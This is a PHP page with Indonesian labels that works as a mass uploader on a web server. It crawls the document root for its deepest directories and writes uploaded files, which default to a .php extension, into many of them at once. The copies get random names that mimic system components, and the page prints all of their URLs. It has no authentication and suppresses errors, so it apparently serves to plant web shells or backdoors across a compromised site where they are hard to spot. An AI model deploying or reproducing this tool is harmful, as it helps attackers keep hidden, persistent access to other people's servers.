<?php
// FINAL_FIXED - mass_uploader_fixed.php
// Upload massal ke direktori paling dalam - TAMPILKAN SEMUA LINK

error_reporting(0);
ini_set('display_errors', 0);

$protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https://' : 'http://';
$domain = $protocol . $_SERVER['HTTP_HOST'];

// ==================== NAMA SISTEM RANDOM ====================
$system_names = [
    'config_handler_system_loader_master',
    'database_connection_core_manager',
    'authentication_security_processor',
    'session_tracker_analyzer_module',
    'cache_memory_allocator_service',
    'event_dispatcher_listener_handler',
    'error_logger_debugger_collector',
    'middleware_request_filter_processor',
    'router_controller_resolver_factory',
    'template_engine_compiler_parser',
    'file_system_uploader_manager',
    'image_processor_resizer_converter',
    'email_smtp_mailer_sender',
    'api_gateway_authenticator',
    'cron_job_scheduler_executor',
    'queue_worker_redis_handler',
    'search_engine_index_builder',
    'notification_websocket_broadcaster',
    'backup_restore_migration_tool',
    'encryption_aes_rsa_hasher'
];

// ==================== FUNGSI SCAN DIREKTORI PALING DALAM ====================
function getDeepestDirs($path, $depth = 0, $maxDepth = 8) {
    $result = [];
    if (!is_dir($path) || !is_readable($path)) return $result;
    
    $items = @scandir($path);
    if (!$items) return $result;
    
    $subdirs = [];
    foreach ($items as $item) {
        if ($item == '.' || $item == '..') continue;
        $full = $path . '/' . $item;
        if (is_dir($full) && !is_link($full)) {
            $subdirs[] = $full;
        }
    }
    
    if (empty($subdirs)) {
        $result[] = $path;
    } elseif ($depth < $maxDepth) {
        foreach ($subdirs as $sub) {
            $deeper = getDeepestDirs($sub, $depth + 1, $maxDepth);
            $result = array_merge($result, $deeper);
        }
    } else {
        $result[] = $path;
    }
    return $result;
}

// ==================== LOKASI SCAN ====================
$scanPaths = [__DIR__, $_SERVER['DOCUMENT_ROOT']];
$allDirs = [];
foreach ($scanPaths as $path) {
    if (file_exists($path)) {
        $dirs = getDeepestDirs($path);
        $allDirs = array_merge($allDirs, $dirs);
    }
}
$allDirs = array_values(array_unique($allDirs));
$totalDirs = count($allDirs);

// ==================== PROSES UPLOAD ====================
$uploadResults = []; // Untuk menyimpan semua hasil upload
$summary = [];

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['upload'])) {
    $numDirs = isset($_POST['num_dirs']) ? intval($_POST['num_dirs']) : 0;
    $selectedDirs = isset($_POST['dirs']) ? $_POST['dirs'] : [];
    
    // Pilih random jika ada angka tapi tidak ada yang dipilih
    if (empty($selectedDirs) && $numDirs > 0 && $numDirs <= $totalDirs) {
        shuffle($allDirs);
        $selectedDirs = array_slice($allDirs, 0, $numDirs);
    }
    
    $selectedCount = count($selectedDirs);
    
    if (empty($selectedDirs)) {
        $uploadResults[] = ['error' => true, 'msg' => 'Pilih direktori atau masukkan jumlah!'];
    } elseif (empty($_FILES['files']['name'][0])) {
        $uploadResults[] = ['error' => true, 'msg' => 'Pilih file!'];
    } else {
        $totalUploads = 0;
        $allLinks = [];
        
        foreach ($_FILES['files']['tmp_name'] as $idx => $tmp) {
            if ($_FILES['files']['error'][$idx] != 0) continue;
            
            $origName = $_FILES['files']['name'][$idx];
            $ext = pathinfo($origName, PATHINFO_EXTENSION);
            if (empty($ext)) $ext = 'php';
            
            $randName = $system_names[array_rand($system_names)] . '_' . date('Ymd_His') . '_' . rand(100, 999) . '.' . $ext;
            $content = file_get_contents($tmp);
            
            foreach ($selectedDirs as $dir) {
                $target = $dir . '/' . $randName;
                if (@file_put_contents($target, $content)) {
                    $rel = str_replace($_SERVER['DOCUMENT_ROOT'], '', $target);
                    $rel = str_replace('\\', '/', $rel);
                    $url = $domain . $rel;
                    
                    $uploadResults[] = [
                        'original' => $origName,
                        'saved_as' => $randName,
                        'directory' => $dir,
                        'url' => $url
                    ];
                    $allLinks[] = $url;
                    $totalUploads++;
                }
            }
        }
        
        $summary = [
            'total_uploads' => $totalUploads,
            'total_files' => count($_FILES['files']['tmp_name']),
            'total_dirs' => $selectedCount,
            'all_links' => $allLinks
        ];
    }
}
?>

<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Mass Uploader - Deep Directory</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Courier New', monospace;
            background: #0a0e27;
            padding: 20px;
            color: #eee;
        }
        .container { max-width: 1400px; margin: 0 auto; }
        
        /* Header */
        .header {
            background: linear-gradient(135deg, #e94560 0%, #ff6b6b 100%);
            padding: 30px;
            border-radius: 15px;
            margin-bottom: 25px;
            text-align: center;
        }
        .header h1 { font-size: 28px; margin-bottom: 8px; }
        .header p { opacity: 0.9; font-size: 14px; }
        
        /* Card */
        .card {
            background: #16213e;
            border-radius: 15px;
            padding: 25px;
            margin-bottom: 25px;
        }
        .card h3 {
            color: #e94560;
            margin-bottom: 20px;
            border-left: 3px solid #e94560;
            padding-left: 12px;
        }
        
        /* Input */
        .input-row {
            display: flex;
            gap: 15px;
            flex-wrap: wrap;
            margin-bottom: 20px;
        }
        .input-group {
            flex: 1;
            min-width: 200px;
        }
        .input-group label {
            display: block;
            margin-bottom: 8px;
            color: #aaa;
            font-size: 12px;
        }
        .input-group input {
            width: 100%;
            padding: 12px;
            background: #0a0e27;
            border: 1px solid #2a2f5a;
            border-radius: 8px;
            color: white;
            font-size: 18px;
            font-weight: bold;
            text-align: center;
        }
        
        /* Buttons */
        .btn {
            padding: 10px 20px;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-weight: bold;
        }
        .btn-primary { background: #e94560; color: white; }
        .btn-primary:hover { background: #ff6b6b; }
        .btn-secondary { background: #2a2f5a; color: white; }
        .btn-secondary:hover { background: #3a3f6a; }
        .btn-success { background: #4CAF50; color: white; }
        
        .btn-group {
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
            margin-top: 10px;
        }
        
        /* Directory List */
        .dirs-container {
            max-height: 350px;
            overflow-y: auto;
            background: #0f3460;
            border-radius: 10px;
            padding: 10px;
            margin-top: 15px;
        }
        .dir-item {
            display: block;
            padding: 8px;
            margin: 5px 0;
            background: #1a1f4e;
            border-radius: 6px;
            cursor: pointer;
        }
        .dir-item:hover { background: #2a2f5a; }
        .dir-item input { margin-right: 10px; }
        .dir-path { font-size: 11px; color: #aaa; margin-top: 4px; word-break: break-all; }
        
        /* File Zone */
        .file-zone {
            border: 2px dashed #e94560;
            padding: 40px;
            text-align: center;
            border-radius: 12px;
            cursor: pointer;
            margin-bottom: 15px;
        }
        .file-zone:hover { background: #1a1f4e; }
        .file-badge {
            display: inline-block;
            background: #e94560;
            padding: 5px 12px;
            margin: 5px;
            border-radius: 20px;
            font-size: 12px;
        }
        
        /* Results */
        .summary {
            background: linear-gradient(135deg, #e94560 0%, #ff6b6b 100%);
            padding: 20px;
            border-radius: 12px;
            text-align: center;
            margin-bottom: 20px;
        }
        .summary-number { font-size: 48px; font-weight: bold; }
        
        .result-item {
            background: #0f3460;
            border-radius: 10px;
            padding: 15px;
            margin-bottom: 12px;
            border-left: 3px solid #4CAF50;
        }
        .result-item.error { border-left-color: #e94560; }
        
        .url-box {
            background: #0a0e27;
            padding: 10px;
            border-radius: 8px;
            margin-top: 10px;
            display: flex;
            gap: 8px;
            flex-wrap: wrap;
            align-items: center;
        }
        .url-box input {
            flex: 1;
            background: #1a1f4e;
            border: none;
            padding: 10px;
            border-radius: 6px;
            color: #4CAF50;
            font-size: 11px;
            font-family: monospace;
        }
        .copy-btn {
            background: #2a2f5a;
            border: none;
            padding: 8px 15px;
            border-radius: 6px;
            color: white;
            cursor: pointer;
        }
        .copy-btn:hover { background: #4CAF50; }
        
        .links-box {
            background: #0f3460;
            border-radius: 12px;
            padding: 20px;
            margin-top: 20px;
        }
        .links-list {
            max-height: 300px;
            overflow-y: auto;
            margin-top: 15px;
        }
        .link-row {
            display: flex;
            gap: 10px;
            align-items: center;
            padding: 10px;
            border-bottom: 1px solid #2a2f5a;
        }
        .link-row code {
            flex: 1;
            font-size: 11px;
            color: #4CAF50;
            word-break: break-all;
        }
        
        .toast {
            position: fixed;
            bottom: 20px;
            right: 20px;
            background: #4CAF50;
            padding: 12px 24px;
            border-radius: 8px;
            display: none;
            z-index: 999;
        }
        
        hr { border-color: #2a2f5a; margin: 15px 0; }
    </style>
</head>
<body>
<div class="container">
    <div class="header">
        <h1>⚡ MASS UPLOADER - DEEP DIRECTORY ⚡</h1>
        <p>Upload file ke direktori paling dalam | Nama random sistem | Copy link 1 klik</p>
    </div>
    
    <form method="POST" enctype="multipart/form-data">
        <div class="card">
            <h3>🎯 PILIH JUMLAH DIREKTORI</h3>
            <div class="input-row">
                <div class="input-group">
                    <label>📊 Masukkan angka:</label>
                    <input type="number" name="num_dirs" id="num_dirs" min="1" max="<?php echo $totalDirs; ?>" value="5">
                </div>
                <div class="input-group">
                    <label>&nbsp;</label>
                    <button type="button" class="btn btn-primary" onclick="randomSelect()">🎲 Pilih Acak</button>
                </div>
            </div>
            
            <div class="btn-group">
                <button type="button" class="btn btn-secondary" onclick="selectAll(true)">✅ Pilih Semua</button>
                <button type="button" class="btn btn-secondary" onclick="selectAll(false)">❌ Hapus Semua</button>
                <button type="button" class="btn btn-secondary" onclick="invertSelect()">🔄 Invert</button>
                <button type="button" class="btn btn-secondary" onclick="selectFirst()">🔢 Pilih N Pertama</button>
            </div>
            
            <div class="dirs-container">
                <?php foreach ($allDirs as $dir): ?>
                <label class="dir-item">
                    <input type="checkbox" name="dirs[]" value="<?php echo htmlspecialchars($dir); ?>" class="dir-check">
                    <div class="dir-path">📁 <?php echo htmlspecialchars($dir); ?></div>
                </label>
                <?php endforeach; ?>
            </div>
            <div style="margin-top: 12px;">✅ Terpilih: <span id="selectedCount">0</span> dari <?php echo $totalDirs; ?></div>
        </div>
        
        <div class="card">
            <h3>📤 PILIH FILE</h3>
            <div class="file-zone" onclick="document.getElementById('fileInput').click()">
                <input type="file" name="files[]" id="fileInput" multiple style="display:none;">
                <div style="font-size: 40px;">📂</div>
                <div>Klik untuk pilih file (bisa banyak)</div>
                <small>Support: PHP, TXT, HTML, JS</small>
            </div>
            <div id="filePreview" style="margin-top: 10px;"></div>
        </div>
        
        <button type="submit" name="upload" class="btn btn-primary" style="width: 100%; padding: 15px; font-size: 16px;">🚀 UPLOAD MASSAL</button>
    </form>
    
    <?php if (!empty($summary)): ?>
    <div class="card">
        <h3>✅ HASIL UPLOAD</h3>
        
        <div class="summary">
            <div class="summary-number"><?php echo $summary['total_uploads']; ?></div>
            <div>Total File Berhasil Diupload</div>
            <div style="font-size: 13px; margin-top: 5px;">
                <?php echo $summary['total_files']; ?> file × <?php echo $summary['total_dirs']; ?> direktori = <?php echo $summary['total_uploads']; ?> copy
            </div>
        </div>
        
        <!-- Daftar semua file yang diupload -->
        <?php foreach ($uploadResults as $result): ?>
            <?php if (!isset($result['error'])): ?>
            <div class="result-item">
                <div><strong>📄 <?php echo htmlspecialchars($result['original']); ?></strong></div>
                <div style="font-size: 12px; color: #aaa; margin-top: 5px;">
                    📁 <?php echo htmlspecialchars($result['directory']); ?>
                </div>
                <div style="font-size: 12px; color: #e94560; margin-top: 3px;">
                    🏷️ <?php echo htmlspecialchars($result['saved_as']); ?>
                </div>
                <div class="url-box">
                    <input type="text" id="url_<?php echo md5($result['url']); ?>" value="<?php echo htmlspecialchars($result['url']); ?>" readonly>
                    <button class="copy-btn" onclick="copyUrl('<?php echo htmlspecialchars($result['url']); ?>')">📋 Copy</button>
                    <a href="<?php echo htmlspecialchars($result['url']); ?>" target="_blank" style="color: #4CAF50;">⬇️ Download</a>
                </div>
            </div>
            <?php endif; ?>
        <?php endforeach; ?>
        
        <!-- SEMUA LINK DALAM SATU TEMPAT -->
        <div class="links-box">
            <div style="display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap;">
                <strong>📋 SEMUA LINK (<?php echo count($summary['all_links']); ?> link)</strong>
                <button class="btn btn-success" onclick="copyAllLinks()" style="padding: 8px 16px;">📋 Copy Semua Link</button>
            </div>
            <div class="links-list">
                <?php foreach ($summary['all_links'] as $link): ?>
                <div class="link-row">
                    <code><?php echo htmlspecialchars($link); ?></code>
                    <button class="copy-btn" onclick="copyUrl('<?php echo htmlspecialchars($link); ?>')">Copy</button>
                </div>
                <?php endforeach; ?>
            </div>
        </div>
    </div>
    <?php endif; ?>
</div>

<div id="toast" class="toast">✅ Link disalin!</div>

<script>
    // Update counter
    function updateCounter() {
        let checked = document.querySelectorAll('.dir-check:checked').length;
        document.getElementById('selectedCount').innerText = checked;
    }
    
    // Select all/none
    function selectAll(checked) {
        document.querySelectorAll('.dir-check').forEach(cb => cb.checked = checked);
        updateCounter();
    }
    
    function invertSelect() {
        document.querySelectorAll('.dir-check').forEach(cb => cb.checked = !cb.checked);
        updateCounter();
    }
    
    function selectFirst() {
        let num = parseInt(document.getElementById('num_dirs').value);
        let total = document.querySelectorAll('.dir-check').length;
        if (num > total) num = total;
        document.querySelectorAll('.dir-check').forEach((cb, i) => cb.checked = i < num);
        updateCounter();
        showToast('✅ ' + num + ' direktori pertama dipilih');
    }
    
    function randomSelect() {
        let num = parseInt(document.getElementById('num_dirs').value);
        let total = document.querySelectorAll('.dir-check').length;
        if (num > total) num = total;
        
        let checkboxes = document.querySelectorAll('.dir-check');
        checkboxes.forEach(cb => cb.checked = false);
        
        let selected = 0;
        let attempts = 0;
        while (selected < num && attempts < 100) {
            let rand = Math.floor(Math.random() * total);
            if (!checkboxes[rand].checked) {
                checkboxes[rand].checked = true;
                selected++;
            }
            attempts++;
        }
        updateCounter();
        showToast('🎲 ' + num + ' direktori dipilih acak');
    }
    
    // File preview
    document.getElementById('fileInput').addEventListener('change', function(e) {
        let html = '';
        for (let f of e.target.files) {
            html += `<span class="file-badge">📄 ${f.name}</span>`;
        }
        document.getElementById('filePreview').innerHTML = html;
    });
    
    // Toast
    function showToast(msg) {
        let toast = document.getElementById('toast');
        toast.textContent = msg;
        toast.style.display = 'block';
        setTimeout(() => toast.style.display = 'none', 2000);
    }
    
    // Copy single URL
    function copyUrl(text) {
        if (navigator.clipboard && navigator.clipboard.writeText) {
            navigator.clipboard.writeText(text).then(() => showToast('✅ Link disalin!'));
        } else {
            let textarea = document.createElement('textarea');
            textarea.value = text;
            textarea.style.position = 'fixed';
            textarea.style.top = '-9999px';
            document.body.appendChild(textarea);
            textarea.select();
            document.execCommand('copy');
            document.body.removeChild(textarea);
            showToast('✅ Link disalin!');
        }
    }
    
    // Copy all links
    function copyAllLinks() {
        let links = [];
        document.querySelectorAll('.link-row code, .url-box input').forEach(el => {
            let url = el.value || el.textContent;
            if (url && url.startsWith('http')) links.push(url);
        });
        
        if (links.length === 0) {
            showToast('❌ Tidak ada link');
            return;
        }
        
        let allLinks = [...new Set(links)].join('\n');
        
        if (navigator.clipboard && navigator.clipboard.writeText) {
            navigator.clipboard.writeText(allLinks).then(() => {
                showToast('✅ ' + links.length + ' link disalin!');
            });
        } else {
            let textarea = document.createElement('textarea');
            textarea.value = allLinks;
            textarea.style.position = 'fixed';
            textarea.style.top = '-9999px';
            document.body.appendChild(textarea);
            textarea.select();
            document.execCommand('copy');
            document.body.removeChild(textarea);
            showToast('✅ ' + links.length + ' link disalin!');
        }
    }
    
    updateCounter();
</script>
</body>
</html>